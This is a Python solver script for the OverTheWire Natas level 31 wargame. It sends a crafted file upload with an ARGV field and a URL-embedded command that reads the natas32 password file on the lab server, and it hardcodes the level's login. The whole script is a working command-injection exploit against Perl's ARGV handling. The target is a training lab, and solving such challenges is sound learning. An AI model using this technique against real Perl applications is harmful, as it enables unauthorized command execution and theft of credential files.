import requests
import re

URL = "http://natas31.natas.labs.overthewire.org/index.pl?/bin/cat%20/etc/natas_webpass/natas32%20|"
USERNAME = "natas31"
PASSWORD = "hay7aecuungiuKaezuathuk9biin0pu1"

files = {'file': ("file.csv", "1, 2, 3", "text/csv")}
data = {'file': 'ARGV'}

x = requests.post(URL, auth=(USERNAME, PASSWORD), files=files, data=data)
flag = re.findall(r'<tr><th>(.*)', x.text)[0]
print(flag)
